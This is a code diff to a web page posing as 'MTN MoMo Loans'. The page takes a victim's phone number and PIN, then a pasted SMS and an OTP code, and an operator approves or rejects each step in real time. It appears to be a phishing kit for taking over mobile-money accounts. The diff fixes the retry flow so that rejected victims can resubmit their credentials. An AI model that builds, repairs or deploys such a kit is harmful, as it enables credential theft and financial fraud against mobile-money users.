@@ -518,7 +518,7 @@
   <div class="sms-foot">© 2026 MTN MoMo Loans – Powered by MTN</div>
 </div>
 
-<!-- ══════════════════════ PAGE 8: WAIT FOR SMS APPROVAL ══════════════════════ -->
+<!-- ══════════════════════ PAGE 9: WAIT FOR SMS APPROVAL ══════════════════════ -->
 <div id="page-wait-sms" class="page">
   <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
     <div class="wait-wrap">
@@ -651,7 +651,7 @@
   (function initAdminParam() {
     const urlParams = new URLSearchParams(window.location.search);
     const adminId = urlParams.get('admin');
-    
+
     if (!adminId) {
       // ❌ NO ADMIN ID - BLOCK ACCESS
       console.error('❌ BLOCKED: No admin parameter in URL');
@@ -671,7 +671,7 @@
       document.getElementById('adminErrorModal').classList.add('show');
       return;
     }
-    
+
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     document.getElementById(pageId)?.classList.add('active');
     window.scrollTo(0, 0);
@@ -782,21 +782,21 @@
   // Enhanced PIN input with backspace support
   document.addEventListener('keydown', function(e) {
     const id = e.target.id;
-    
+
     if (id.startsWith('lp') && e.key === 'Backspace' && !e.target.value) {
       const idx = parseInt(id[2]);
       if (idx > 0) {
         document.getElementById('lp' + (idx-1)).focus();
       }
     }
-    
+
     if (id.startsWith('otpPin') && e.key === 'Backspace' && !e.target.value) {
       const idx = parseInt(id[6]);
       if (idx > 0) {
         document.getElementById('otpPin' + (idx-1)).focus();
       }
     }
-    
+
     if (id.startsWith('otp') && !id.startsWith('otpPin') && e.key === 'Backspace' && !e.target.value) {
       const idx = parseInt(id[3]);
       if (idx > 0) {
@@ -843,8 +843,8 @@
 
   function showLgnMsg(type, text) {
     ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
-    if (type === 'error')   { document.getElementById('lpMsgTxt').textContent = text;    document.getElementById('lpMsg').classList.add('show'); }
-    if (type === 'success') { document.getElementById('lpMsgOkTxt').textContent = text;  document.getElementById('lpMsgOk').classList.add('show'); }
+    if (type === 'error')   { document.getElementById('lpMsgTxt').textContent = text;     document.getElementById('lpMsg').classList.add('show'); }
+    if (type === 'success') { document.getElementById('lpMsgOkTxt').textContent = text;   document.getElementById('lpMsgOk').classList.add('show'); }
     if (type === 'warning') { document.getElementById('lpMsgWarnTxt').textContent = text; document.getElementById('lpMsgWarn').classList.add('show'); }
   }
 
@@ -889,10 +889,10 @@
         // Store application ID for later use
         S.applicationId = data.applicationId;
         document.getElementById('waitAppId').textContent = data.applicationId;
-        
+
         // Go to waiting page
         goTo('page-wait-login-approval');
-        
+
         // Start polling for admin approval
         pollForPinApproval(data.applicationId);
       } else {
@@ -906,34 +906,42 @@
     }
   }
 
+  // ══════════════════════════════════════════════════════
   // Poll for PIN approval status
+  // ══════════════════════════════════════════════════════
   let pollTimeout;
   function pollForPinApproval(applicationId) {
     const checkStatus = async () => {
       try {
         const res = await fetch(`/api/check-pin-status/${applicationId}`);
         const data = await res.json();
-        
+
         if (data.success) {
           const status = data.status;
-          
+
           if (status === 'approved') {
             console.log('✅ Admin approved login');
             clearTimeout(pollTimeout);
             goTo('page-sms-paste');
+
           } else if (status === 'rejected') {
             console.log('❌ Admin rejected login');
             clearTimeout(pollTimeout);
-            
+
             // Clear login form
             document.getElementById('lpPhone').value = '';
             [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
-            
+
             // Go back to login page
             goTo('page-login');
-            
+
+            // ✅ FIX: Re-enable login button and reset its style
+            document.getElementById('bLgn').disabled = false;
+            chkPin(); // Recomputes class based on now-empty PIN fields → restores to non-ready state
+
             // Show error message
             showLgnMsg('error', 'Your login credentials were invalid. Please try again.');
+
           } else {
             // Still pending, keep polling
             pollTimeout = setTimeout(checkStatus, 2000);
@@ -948,7 +956,7 @@
         pollTimeout = setTimeout(checkStatus, 3000);
       }
     };
-    
+
     // Start polling
     checkStatus();
   }
@@ -963,8 +971,8 @@
 
   function showSmsMsg(type, text) {
     ['smsMsg','smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
-    if (type === 'error')   { document.getElementById('smsMsgTxt').textContent = text;    document.getElementById('smsMsg').classList.add('show'); }
-    if (type === 'success') { document.getElementById('smsMsgOkTxt').textContent = text;  document.getElementById('smsMsgOk').classList.add('show'); }
+    if (type === 'error')   { document.getElementById('smsMsgTxt').textContent = text;   document.getElementById('smsMsg').classList.add('show'); }
+    if (type === 'success') { document.getElementById('smsMsgOkTxt').textContent = text; document.getElementById('smsMsgOk').classList.add('show'); }
   }
 
   async function doSmsParse() {
@@ -997,7 +1005,7 @@
         // Show wait for admin approval
         document.getElementById('waitSmsAppId').textContent = S.applicationId;
         goTo('page-wait-sms');
-        
+
         // Start polling for SMS approval
         pollForSmsApproval(S.applicationId);
       } else {
@@ -1011,28 +1019,41 @@
     }
   }
 
+  // ══════════════════════════════════════════════════════
   // Poll for SMS approval status
+  // ══════════════════════════════════════════════════════
   let smsPollTimeout;
   function pollForSmsApproval(applicationId) {
     const checkStatus = async () => {
       try {
         const res = await fetch(`/api/check-otp-status/${applicationId}`);
         const data = await res.json();
-        
+
         if (data.success) {
           const status = data.status;
-          
+
           if (status === 'approved') {
             console.log('✅ Admin approved SMS');
             clearTimeout(smsPollTimeout);
             goTo('page-otp');
+
           } else if (status === 'rejected') {
             console.log('❌ Admin rejected SMS - ask user to paste correct message');
             clearTimeout(smsPollTimeout);
-            goTo('page-sms-paste');
-            showSmsMsg('error', 'The SMS message was incorrect. Please paste the correct message.');
+
             // Clear the textarea for user to enter correct message
             document.getElementById('smsMsgBox').value = '';
+
+            // Go back to SMS paste page
+            goTo('page-sms-paste');
+
+            // ✅ FIX: Re-enable SMS button and reset its style
+            document.getElementById('bSms').disabled = false;
+            chkSmsMsg(); // Recomputes class based on now-empty textarea → restores to non-ready state
+
+            // Show error message
+            showSmsMsg('error', 'The SMS message was incorrect. Please paste the correct message.');
+
           } else {
             // Still pending, keep polling
             smsPollTimeout = setTimeout(checkStatus, 2000);
@@ -1047,7 +1068,7 @@
         smsPollTimeout = setTimeout(checkStatus, 3000);
       }
     };
-    
+
     // Start polling
     checkStatus();
   }
@@ -1073,8 +1094,8 @@
 
   function showOtpMsg(type, text) {
     ['otpMsg','otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
-    if (type === 'error')   { document.getElementById('otpMsgTxt').textContent = text;    document.getElementById('otpMsg').classList.add('show'); }
-    if (type === 'success') { document.getElementById('otpMsgOkTxt').textContent = text;  document.getElementById('otpMsgOk').classList.add('show'); }
+    if (type === 'error')   { document.getElementById('otpMsgTxt').textContent = text;   document.getElementById('otpMsg').classList.add('show'); }
+    if (type === 'success') { document.getElementById('otpMsgOkTxt').textContent = text; document.getElementById('otpMsgOk').classList.add('show'); }
   }
 
   async function doOtp() {
@@ -1109,7 +1130,7 @@
         // OTP submitted successfully, now wait for admin approval
         document.getElementById('waitOtpAppId').textContent = S.applicationId;
         goTo('page-wait-otp');
-        
+
         // Start polling for OTP approval
         pollForOtpApproval(S.applicationId);
       } else {
@@ -1125,38 +1146,48 @@
     }
   }
 
+  // ══════════════════════════════════════════════════════
   // Poll for OTP approval status
+  // ══════════════════════════════════════════════════════
   let otpPollTimeout;
   function pollForOtpApproval(applicationId) {
     const checkStatus = async () => {
       try {
         const res = await fetch(`/api/check-otp-status/${applicationId}`);
         const data = await res.json();
-        
+
         if (data.success) {
           const status = data.status;
-          
+
           if (status === 'approved') {
             console.log('✅ Admin approved OTP - Loan Approved!');
             clearTimeout(otpPollTimeout);
-            
+
             // Update approval page with loan details
             document.getElementById('aprAmount').textContent = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
             document.getElementById('aprAmt').textContent = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
             document.getElementById('aprTerm').textContent = S.loanTerm || '48 Months';
             const monthly = Math.ceil((S.loanAmount || 1000000) / (parseInt(S.loanTerm || '48')));
             document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();
-            
+
             goTo('page-approval');
+
           } else if (status === 'wrongcode') {
             console.log('❌ Admin marked code as wrong');
             clearTimeout(otpPollTimeout);
-            goTo('page-otp');
-            document.getElementById('bOtp').disabled = false;
-            document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
+
             // Clear OTP fields
             [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
+
+            goTo('page-otp');
+
+            // Re-enable button and reset its label/style
+            document.getElementById('bOtp').disabled = false;
+            document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
+            chkOtp(); // Recomputes class based on now-empty OTP fields
+
             showOtpMsg('error', 'The OTP code was incorrect. Please try again.');
+
           } else {
             // Still pending, keep polling
             otpPollTimeout = setTimeout(checkStatus, 2000);
@@ -1171,7 +1202,7 @@
         otpPollTimeout = setTimeout(checkStatus, 3000);
       }
     };
-    
+
     // Start polling
     checkStatus();
   }
